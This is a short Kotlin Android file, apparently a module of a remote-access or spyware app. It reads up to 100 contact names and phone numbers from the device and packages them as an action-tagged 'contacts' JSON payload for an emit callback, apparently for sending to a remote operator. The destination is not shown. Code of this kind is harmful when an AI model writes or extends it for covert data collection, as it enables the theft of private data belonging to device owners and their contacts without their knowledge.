package com.app.cyber

import android.content.Context
import android.provider.ContactsContract
import org.json.JSONArray
import org.json.JSONObject

object ContactsRechive {
    fun listContacts(ctx: Context, emit: (JSONObject) -> Unit) {
        val list = JSONArray()
        val cursor = ctx.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null
        )
        
        cursor?.use {
            val nameCol = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numCol = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            
            while (it.moveToNext() && list.length() < 100) {
                val obj = JSONObject()
                obj.put("name", it.getString(nameCol) ?: "")
                obj.put("number", it.getString(numCol) ?: "")
                list.put(obj)
            }
        }
        
        val payload = JSONObject()
        payload.put("action", "contacts")
        payload.put("data", list)
        emit(payload)
    }
}
